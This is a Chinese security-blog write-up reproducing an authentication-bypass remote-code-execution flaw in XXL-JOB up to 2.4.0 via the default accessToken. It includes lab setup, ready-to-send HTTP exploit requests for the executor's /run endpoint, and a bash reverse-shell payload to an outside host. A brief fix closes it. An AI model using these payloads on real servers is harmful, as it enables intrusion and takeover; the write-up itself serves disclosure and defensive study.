#  XXL-JOB默认accessToken身份认证绕过RCE   
原创 Arvin  Timeline Sec   2024-07-05 18:30  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！作者：Arvin@Timeline Sec 本文字数：2867阅读时长：2～4min 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
XXL-JOB 是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。  
## 0x02 漏洞概述  
  
XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。  
## 0x03 影响版本  
  
XXL-JOB <= 2.4.0  
## 0x04 环境搭建  
  
**Docker方式构建**  
  
**1.拉取镜像**  
  
docker pull xuxueli/xxl-job-admin:2.4.0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFjgUcvdEPF1bZMrxQl7YYr7t8lJcVXdw8icX1vYMOH4RA2hv2jXsUMkg/640?wx_fmt=png&from=appmsg "")  
  
**2.创建数据库**  
  
docker pull mysql  
  
docker run -d  --name mysql -e MYSQL_ROOT_PASSWORD=root -p 13306:13306 mysql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVF55UiccWD9NFOE2nsseruj0NCy44UVPMznHOyoD9urfRjq3mu9ndzib7g/640?wx_fmt=png&from=appmsg "")  
  
**3.用navicat连接数据库并运行xxl-job.sql文件**  
  
xxl-job.sql下载地址：https://github.com/xuxueli/xxl-job/tree/master/doc/db  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFusO4B7mDpNxv0N0XVT7AIXboET73q2Y1oq7wR18eGGWNcZ4BNbSLkg/640?wx_fmt=png&from=appmsg "")  
  
打开navicat连接数据库，新建一个名称叫xxl-job名称的数据库，进入该xxl-job名称数据库，并执行xxl-job.sql文件  
  
**4.创建xxl-job容器并启动**  
```
docker run --privileged=true -e PARAMS="--spring.datasource.username=root --spring.datasource.password=123456 --spring.datasource.url=jdbc:mysql://yourip:13306/xxl_job?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&serverTimezone=Asia/Shanghai" -p 8080:8080 -v /home/xxl-job/logs:/data/applogs --name xxl-job-admin -d xuxueli/xxl-job-admin:2.4.0

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFB5MpxxIFhKDxTtFNFmoArgJ06QHcCLGDsMyrVKZwS17nN7hn4KNcAA/640?wx_fmt=png&from=appmsg "")  
  
访问http://yourip:8080/xxl-job-admin/toLogin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFUicnqPR4M7NKChyTqicGFRDdZaw3HDBW2uRzaTOmf7t3YMHY7pMjgpAQ/640?wx_fmt=png&from=appmsg "")  
  
**执行器搭建**  
  
**1.下载Source并编译成jar包**  
  
https://github.com/xuxueli/xxl-job  
  
使用idea或maven编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFUs5dV2V9ZYqoGsqZJRQ3V7RuRjbOelts44Emnb6vXpHDibkmOsS8RvA/640?wx_fmt=png&from=appmsg "")  
  
**2.下载application.properties并根据实际情况修改**  
  
 wget https://github.com/xuxueli/xxl-job/raw/2.4.0/xxl-job-executor-samples/xxl-job-executor-sample-springboot/src/main/resources/application.properties  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFoXuCD9alEfEWeqfDbgH7OAV3QicC5xdezqNIGBlicfnSfUuPu9Rd4DFg/640?wx_fmt=png&from=appmsg "")  
  
**3.运行**  
  
nohup java -jar ./xxl-job-executor-sample-springboot.jar --spring.config.location=./application.properties &  
  
**4.验证**  
  
执行器中管理中对应节点已经自动注册  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVF0I5IlUZ9J5kSYzM1JxjktYF5wFa4iatYw8CsEWq1Baaia7243ic1KlOkw/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
**POC：**  
```
POST /run HTTP/1.1
Host: 
XXL-JOB-ACCESS-TOKEN: default_token
Content-Length: 326
 
{
"jobId":1,
"executorHandler":"demoJobHandler",
"executorParams":"demoJobHandler",
"executorBlockStrategy":"COVER_EARLY",
"executorTimeout":0,
"logId":1,
"logDateTime":1710864010,
"glueType":"GLUE_SHELL",
"glueSource":"ping xxxx.dnslog.cn",
"glueUpdatetime":1710864010,
"broadcastIndex":0,
"broadcastTotal":0
}

```  
  
**DNSLog**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVF6FH4ZRYxwvQ0C5l5QeKuJYIpKPrCUHJhGH7ASYJSDFib4UlqNETp4sg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFJw1mhibOnjAO3ibqyxWlXfiaJ11MgFUWzSjyCejkib6xfgDNe1So8aGtYQ/640?wx_fmt=png&from=appmsg "")  
  
**Getshell**  
  
**POC：**  
```
POST /run HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Host: 
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
Upgrade-Insecure-Requests: 1
Content-Length: 375


{
"jobId": 2,
"executorHandler": "demoJobHandler",
"executorParams": "demoJobHandler",
"executorBlockStrategy": "SERIAL_EXECUTION",
"executorTimeout": 0,
"logId": 1,
"logDateTime": 1586373637819,
"glueType": "GLUE_SHELL",
"glueSource": "bash -i >& /dev/tcp/ip/4444 0>&1",
"glueUpdatetime": 1586693836766,
"broadcastIndex": 0,
"broadcastTotal": 0
}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVFCANMfSiaZ5N1iaAlomJYTRxlyZicxiaweYu4MfzBiciaic4jKNAhW8ibymxntg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsgdKDXibsp8m2BcoiboQcFvVF6qcpoTyuw7J4KXiaYnjLdtPLvHeVOibMV5TbmctVY5HFtqTnCoQX7CpA/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
修改调度中心和执行器配置项 xxl.job.accessToken 的默认值，注意要设置相同的值。  
## 参考链接  
  
https://github.com/xuxueli/xxl-jobhttps://www.xuxueli.com/xxl-job/#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89  
## Checklist  
  
默认账号密码admin/123456executor未授权访问命令执行api未授权Hessian2反序列化  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】获取官方直播精品课程详情  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就收藏起来吧！  
  
顺便点个赞和在看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
